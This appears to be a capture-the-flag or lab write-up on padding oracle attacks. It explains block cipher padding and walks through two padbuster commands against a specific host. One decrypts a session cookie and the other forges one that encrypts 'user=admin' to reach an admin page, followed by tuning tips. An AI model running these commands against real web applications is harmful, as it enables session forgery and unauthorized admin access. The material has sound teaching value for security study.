This type of attacks is usual aimed at the TSL but can occur even on all the application that handles encryption/decryption incorrectly.

# Explanation:
Block ciphers as the word says need to encapsulate data into chunks of prefixed size, if data is shorter that the prefixed size, then some data need to be appended to the end as padding to match the right size.
If our encrypting cipher uses block of 8 bytes, and we want to send the data of 5 bytes(**DE AD BE EF FF**) then we need to append 3 bytes(**FF x 3 times**) to match the correct block size and resulting to:
Start message: **DE AD BE EF FF**    -->		Padding(added 3 bytes as FF): **DE AD BE EF FF FF FF FF** 

The issue arises when the application that receives the encrypted padded data don't know which one is padding bytes and which one the right data.

# Exploit time
```
GET /admin HTTP/1.1
Host: 94.237.56.188:44623
Upgrade-Insecure-Requests: 1
Referer: http://94.237.56.188:44623/home
Cookie: cookie_pop_visited=true; user=MOyWqDiEAnLzvj4aLp9tP4cBXMoY98/o
```
Here the cookie seems B64 encoded and that will ben our "sample data", the URL we have in the get request and the block size we have to guess it (usually 8 to 16). We can also set the **-error** (so the app knows when to stop, IT NEED TO be the error from nonexistent padding)
but also **-encoding**(if we see that the cookie is B64 encoded or similar)

--> 1) We need to brute-force the cookie value with:
```
padbuster http://94.237.56.188:44623/admin "MOyWqDiEAnLzvj4aLp9tP4cBXMoY98/o" -cookies "cookie_pop_visited=true; user=MOyWqDiEAnLzvj4aLp9tP4cBXMoY98/o" 8 -error "Invalid Padding" -usebody

(URL: to the resource admin
Sample: taken from the cookie value
-cookies: Name1:value
8= block size, guessing, if you input too big the app will tell you the size ex 24 then you know it must be dividable ex 8 works here
-error= tells the error string to match so the app knows when to stop
-encoding= integer based can be used if the data is encoded example B64)
```

--> 2) Craft the padding cookie based on the custom string from step 1
```
padbuster http://94.237.56.188:44623/admin "MOyWqDiEAnLzvj4aLp9tP4cBXMoY98/o" -cookies "cookie_pop_visited=true; user=MOyWqDiEAnLzvj4aLp9tP4cBXMoY98/o" 8 -error "Invalid Padding" -plaintext "user=admin"

(Same URL, Sample, Cookie, BlockSize & Error
-plaintext=  cleartext to encrypt to cookie)
```

# TIPS: 
1)If the app makes no difference in HTTPCODE/SIZE of the response then you might need to use **-usebody** to check the response into HTML body as by default it only checks for SIZE/HTTP Response.
2)If you use the **-error** option remember to use the error from wrong padding(example set a nonexistent cookie, and register the response). DO NOT USE THE BASE ERROR THAT YOU ARE NOT AUTHORIZED, IT MUST BE THE PADDING ERROR!
3)Be as exhaustive as possible, add the cookie, encoding, correct size, checkin body, error message. Otherwise it will not work as expected!
4)The sample data need to be either part of URL request, or cookie or POST data but it need to be there so the app know what parameter to fuzz for!